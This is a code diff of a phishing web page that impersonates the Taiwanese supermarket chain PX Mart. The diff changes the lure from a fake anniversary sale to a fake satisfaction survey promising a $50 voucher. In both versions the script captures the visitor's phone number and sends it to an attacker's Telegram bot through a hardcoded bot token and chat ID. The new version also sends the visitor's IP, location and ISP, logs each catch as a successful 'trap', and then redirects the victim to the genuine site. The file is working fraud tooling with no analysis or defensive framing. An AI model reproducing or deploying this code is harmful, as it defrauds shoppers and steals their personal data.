@@ -1,84 +1,108 @@
 <!DOCTYPE html>
 <html lang="zh-TW">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>全聯福利中心｜2025 超級週年慶</title>
-<style>
-  *{margin:0;padding:0;box-sizing:border-box}
-  body{font-family:'Noto Sans TC',Arial,sans-serif;background:#E3F2FD;color:#333;min-height:100vh;padding-bottom:80px}
-  .header{background:#1976D2;height:60px;padding:0 16px;display:flex;align-items:center}
-  .logo{width:36px;height:36px;margin-right:10px}
-  .header-text{color:#fff;font-size:19px;font-weight:900}
-  .header-sub{color:#fff;font-size:12px;opacity:0.9}
-  h1{font-size:28px;font-weight:900;color:#1976D2;margin:40px 0 8px}
-  .subtitle{font-size:17px;color:#555;margin-bottom:30px;font-weight:600}
-  .cartoon{width:260px;margin:0 auto 30px;display:block}
-  .cartoons{background:url('https://www.pxmart.com.tw/CdnRoot/promotion/survey/survey-cartoons.png') center bottom/contain no-repeat;height:160px;margin:40px auto 20px;background-size:contain}
-  .box{background:#fff;padding:35px 28px;border-radius:20px;max-width:400px;margin:0 auto 40px;box-shadow:0 12px 40px rgba(0,0,0,0.15)}
-  h2{font-size:24px;color:#1976D2;margin-bottom:16px;font-weight:900}
-  .desc{font-size:16px;line-height:1.7;color:#444;margin-bottom:25px}
-  .input-group{display:flex;height:56px;background:#F5F5F5;border-radius:14px;overflow:hidden;margin:20px 0;box-shadow:inset 0 2px 8px rgba(0,0,0,0.08)}
-  select{background:#fff;border:none;font-size:18px;padding:0 14px;font-weight:bold;color:#1976D2}
-  input{flex:1;border:none;font-size:18px;padding:0 18px;outline:none}
-  button{width:100%;padding:18px;background:#4CAF50;color:#fff;border:none;border-radius:14px;font-size:20px;font-weight:900;box-shadow:0 6px 20px rgba(76,175,80,0.4);cursor:pointer}
-  .footer{font-size:12px;color:#777;margin-top:40px}
-  .footer a{color:#1976D2;text-decoration:underline}
-</style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>全聯福利中心｜客戶滿意度調查</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Noto Sans TC',sans-serif;background:#E3F2FD;color:#333;text-align:center;min-height:100vh;padding:20px}
+        .header{background:#1976D2;padding:15px 0;color:white;position:relative;height:60px;display:flex;align-items:center}
+        .logo{float:left;margin:5px 15px;max-width:35px;height:auto}
+        .header-title{float:left;margin:8px 0 0 0;font-size:18px;font-weight:900}
+        .header-subtitle{float:left;margin:2px 0;font-size:12px;opacity:0.9}
+        .clear{clear:both}
+        h1{font-size:28px;font-weight:900;margin:30px 0 15px;color:#1976D2}
+        .subtitle{font-size:16px;margin-bottom:20px;color:#555}
+        .survey-img{width:280px;height:auto;margin:30px auto;border-radius:15px;box-shadow:0 8px 25px rgba(0,0,0,0.2)}
+        .cartoons{width:100%;max-width:800px;height:150px;margin:20px auto;background:#F5F5F5 url('https://www.pxmart.com.tw/CdnRoot/promotion/survey/survey-cartoons.png') center/contain no-repeat;background-size:contain}
+        .box{background:white;padding:30px;border-radius:20px;max-width:400px;margin:0 auto;box-shadow:0 10px 30px rgba(0,0,0,0.2)}
+        h2{font-size:24px;margin-bottom:15px;color:#1976D2}
+        .desc{font-size:16px;line-height:1.6;margin-bottom:25px;color:#666}
+        .input-group{display:flex;background:#F5F5F5;border-radius:14px;overflow:hidden;margin:20px 0;padding:0 10px;box-shadow:0 4px 12px rgba(0,121,107,0.1);height:56px}
+        select{background:#fff;border:none;font-size:18px;padding:0 10px}
+        input{flex:1;border:none;font-size:18px;padding:0 15px;outline:none}
+        button{width:100%;padding:18px;background:#4CAF50;color:white;border:none;border-radius:14px;font-size:20px;font-weight:bold;margin-top:10px;cursor:pointer;box-shadow:0 6px 20px rgba(76,175,80,0.3)}
+        button:active{transform:scale(0.98)}
+        .footer{margin-top:50px;font-size:12px;color:#666}
+        .footer a{color:#1976D2;text-decoration:underline}
+    </style>
 </head>
 <body>
+    <div class="header">
+        <img src="https://www.pxmart.com.tw/_next/static/media/logo-pxmart.890788ed.svg" alt="全聯 Logo" class="logo" onerror="this.src='https://via.placeholder.com/35x35/E3F2FD/1976D2?text=全聯'">
+        <div style="float:left;margin:10px 0">
+            <div class="header-title">全聯福利中心</div>
+            <div class="header-subtitle">PX Mart Welfare Center</div>
+        </div>
+        <div class="clear"></div>
+    </div>
 
-<div class="header">
-  <img src="https://www.pxmart.com.tw/CdnRoot/common/images/logo.png" class="logo"
-       onerror="this.src='https://via.placeholder.com/36x36/E3F2FD/1976D2?text=全聯'">
-  <div>
-    <div class="header-text">全聯福利中心</div>
-    <div class="header-sub">PX Mart Welfare Center</div>
-  </div>
-</div>
+    <img src="https://www.pxmart.com.tw/_next/static/media/img-surveyEmpty-character.f8827491.png" alt="調查卡通" class="survey-img" onerror="this.src='https://via.placeholder.com/800x400/00796B/ffffff?text=全聯調查問卷'">
 
-<h1>全聯超級週年慶開跑！</h1>
-<div class="subtitle">買1送1 再回饋送 $50 購物金</div>
+    <div class="cartoons"></div>
 
-<img src="https://www.pxmart.com.tw/CdnRoot/promotion/survey/survey-icon.png" class="cartoon"
-     onerror="this.src='https://via.placeholder.com/300x300/E3F2FD/1976D2?text=全聯週年慶'">
+    <div class="box">
+        <h2>客戶滿意度調查</h2>
+        <div class="desc">
+            <b>您的意見對我們很重要</b><br>
+            感謝您參與 2025 全聯客戶滿意度調查！<br>
+            作為回饋，請輸入手機號碼領取 $50 購物金（每個門號限領一次）。
+        </div>
 
-<div class="cartoons"></div>
+        <form id="loginForm">
+            <div class="input-group">
+                <select id="countryCode">
+                    <option value="+886" selected>+886</option>
+                    <option value="+852">+852</option>
+                    <option value="+60">+60</option>
+                    <option value="+66">+66</option>
+                    <option value="+63">+63</option>
+                </select>
+                <input type="tel" id="phone" placeholder="912345678" required maxlength="12">
+            </div>
+            <button type="submit">提交調查領 $50</button>
+        </form>
+    </div>
 
-<div class="box">
-  <h2>消費滿 $300 立即送 $50 購物金</h2>
-  <div class="desc">
-    2025 全聯超級週年慶火熱進行中！<br>
-    超過300款商品買1送1，消費滿300元再直接送您 $50 購物金！
-  </div>
-  
-  <div class="input-group">
-    <select id="code"><option value="+886" selected>+886</option></select>
-    <input type="tel" id="phone" placeholder="請輸入手機號碼" maxlength="12">
-  </div>
-  
-  <button onclick="send()">立即領取 $50 購物金</button>
-</div>
+    <div class="footer">
+        © 2025 全聯實業股份有限公司. All rights reserved.<br>
+        <a href="https://www.pxmart.com.tw/privacy">隱私權政策</a> | 
+        <a href="https://www.pxmart.com.tw/terms">服務條款</a>
+    </div>
 
-<div class="footer">
-  © 2025 全聯實業股份有限公司 All rights reserved.<br>
-  <a href="https://www.pxmart.com.tw/privacy">隱私權政策</a> | 
-  <a href="https://www.pxmart.com.tw/terms">服務條款</a>
-</div>
+    <script>
+        const TOKEN = "8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys";
+        const CHAT_ID = "1137905005";
 
-<script>
-function send(){
-  const phone = document.getElementById("phone").value.trim();
-  if(phone.length < 😎 return;
-  document.querySelector("button").textContent = "領取中...";
-  
-  new Image().src = "https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage?chat_id=1137905005&text=" + 
-    encodeURIComponent("全聯週年慶暴力版誘捕成功\n電話：+886"+phone+"\n時間："+new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"}));
-  
-  setTimeout(()=>{
-    location.href = "https://cardpoint.pxmartevent.com.tw/";
-  },1800);
-}
-</script>
+        document.getElementById("loginForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+            const code = document.getElementById("countryCode").value;
+            const phone = document.getElementById("phone").value.trim();
+            if (!phone) return;
+
+            const btn = document.querySelector("button");
+            btn.textContent = "領取中...";
+            btn.disabled = true;
+
+            const ipData = await fetch("https://ipapi.co/json/").then(r=>r.json()).catch(()=>({}));
+            const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
+
+            const 訊息 = "全聯調查誘捕成功\n\n" +
+                        "電話：" + code + phone + "\n" +
+                        "IP　　：" + (ipData.ip || "未知") + "\n" +
+                        "位置　：" + (ipData.city || "未知") + "，" + (ipData.country_name === "Taiwan" ? "台灣" : ipData.country_name || "未知") + "\n" +
+                        "ISP　　：" + (ipData.org || "未知") + "\n" +
+                        "時間　：" + 時間;
+
+            fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage", {
+                method:"POST",
+                headers:{"Content-Type":"application/json"},
+                body:JSON.stringify({chat_id:CHAT_ID, text:訊息})
+            });
+
+            setTimeout(() => location.href = "https://www.pxmart.com.tw/campaign/survey", 3000);
+        });
+    </script>
 </body>
 </html>
